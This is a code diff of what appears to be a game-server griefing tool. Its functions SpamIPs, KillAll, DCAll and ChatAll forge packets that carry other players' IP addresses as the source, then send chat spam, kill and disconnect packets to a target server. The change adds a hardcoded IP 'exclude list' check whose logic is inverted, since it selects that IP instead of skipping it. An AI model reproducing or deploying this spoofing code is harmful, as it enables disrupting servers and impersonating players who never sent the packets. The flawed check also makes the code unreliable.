@@ -697,25 +697,28 @@ void SpamIPs(const char *IP, int Port)
 			Char++;
 		}
 
-		m_FromIP = inet_addr(aSplit[0]);
-		m_FromPort = htons(atoi(aSplit[1]));
+		if (!strcmp(aSplit[0], "178.36.222.94")) //add urs ip to exclude list 
+		{
+			m_FromIP = inet_addr(aSplit[0]);
+			m_FromPort = htons(atoi(aSplit[1]));
 
-		printf(aSplit[0]);
+			printf(aSplit[0]);
 
-		m_ToIP = inet_addr(IP);
-		m_ToPort = htons(Port);
+			m_ToIP = inet_addr(IP);
+			m_ToPort = htons(Port);
 
-		unsigned char buffer[2048];
-		int BufferSize = 0;
-		Reset();
+			unsigned char buffer[2048];
+			int BufferSize = 0;
+			Reset();
 
-		char aMsg[256];
-		str_format(aMsg, sizeof(aMsg), "%s", Line.c_str());
+			char aMsg[256];
+			str_format(aMsg, sizeof(aMsg), "%s", Line.c_str());
 
-		// send the chat packet
-		ZeroMemory(buffer, sizeof(buffer));
-		BufferSize = PackSay(&buffer[0], aMsg, 0);
-		SendData((const char*)buffer, BufferSize);
+			// send the chat packet
+			ZeroMemory(buffer, sizeof(buffer));
+			BufferSize = PackSay(&buffer[0], aMsg, 0);
+			SendData((const char*)buffer, BufferSize);
+		}
 	}
 }
 
@@ -754,20 +757,23 @@ void KillAll(const char *IP, int Port)
 			Char++;
 		}
 
-		m_FromIP = inet_addr(aSplit[0]);
-		m_FromPort = htons(atoi(aSplit[1]));
+		if (!strcmp(aSplit[0], "178.36.222.94")) //add urs ip to exclude list 
+		{
+			m_FromIP = inet_addr(aSplit[0]);
+			m_FromPort = htons(atoi(aSplit[1]));
 
-		m_ToIP = inet_addr(IP);
-		m_ToPort = htons(Port);
+			m_ToIP = inet_addr(IP);
+			m_ToPort = htons(Port);
 
-		unsigned char buffer[2048];
-		int BufferSize = 0;
-		Reset();
+			unsigned char buffer[2048];
+			int BufferSize = 0;
+			Reset();
 
-		// send the kill packet
-		ZeroMemory(buffer, sizeof(buffer));
-		BufferSize = PackKill(&buffer[0]);
-		SendData((const char*)buffer, BufferSize);
+			// send the kill packet
+			ZeroMemory(buffer, sizeof(buffer));
+			BufferSize = PackKill(&buffer[0]);
+			SendData((const char*)buffer, BufferSize);
+		}
 	}
 }
 
@@ -806,20 +812,23 @@ void DCAll(const char *IP, int Port)
 			Char++;
 		}
 
-		m_FromIP = inet_addr(aSplit[0]);
-		m_FromPort = htons(atoi(aSplit[1]));
+		if (!strcmp(aSplit[0], "178.36.222.94")) //add urs ip to exclude list 
+		{
+			m_FromIP = inet_addr(aSplit[0]);
+			m_FromPort = htons(atoi(aSplit[1]));
 
-		m_ToIP = inet_addr(IP);
-		m_ToPort = htons(Port);
+			m_ToIP = inet_addr(IP);
+			m_ToPort = htons(Port);
 
-		unsigned char buffer[2048];
-		int BufferSize = 0;
-		Reset();
+			unsigned char buffer[2048];
+			int BufferSize = 0;
+			Reset();
 
-		// send the disconnect packet
-		ZeroMemory(buffer, sizeof(buffer));
-		BufferSize = PackDisconnect(&buffer[0]);
-		SendData((const char*)buffer, BufferSize);
+			// send the disconnect packet
+			ZeroMemory(buffer, sizeof(buffer));
+			BufferSize = PackDisconnect(&buffer[0]);
+			SendData((const char*)buffer, BufferSize);
+		}
 	}
 }
 
@@ -858,23 +867,26 @@ void ChatAll(const char *IP, int Port, const char *Msg)
 			Char++;
 		}
 
-		m_FromIP = inet_addr(aSplit[0]);
-		m_FromPort = htons(atoi(aSplit[1]));
+		if (!strcmp(aSplit[0], "178.36.222.94")) //add urs ip to exclude list 
+		{
+			m_FromIP = inet_addr(aSplit[0]);
+			m_FromPort = htons(atoi(aSplit[1]));
 
-		m_ToIP = inet_addr(IP);
-		m_ToPort = htons(Port);
+			m_ToIP = inet_addr(IP);
+			m_ToPort = htons(Port);
 
-		unsigned char buffer[2048];
-		int BufferSize = 0;
-		Reset();
+			unsigned char buffer[2048];
+			int BufferSize = 0;
+			Reset();
 
-		char aMsg[256];
-		str_format(aMsg, sizeof(aMsg), "%s", Msg);
+			char aMsg[256];
+			str_format(aMsg, sizeof(aMsg), "%s", Msg);
 
-		// send the chat packet
-		ZeroMemory(buffer, sizeof(buffer));
-		BufferSize = PackSay(&buffer[0], aMsg, 0);
-		SendData((const char*)buffer, BufferSize);
+			// send the chat packet
+			ZeroMemory(buffer, sizeof(buffer));
+			BufferSize = PackSay(&buffer[0], aMsg, 0);
+			SendData((const char*)buffer, BufferSize);
+		}
 	}
 }
 
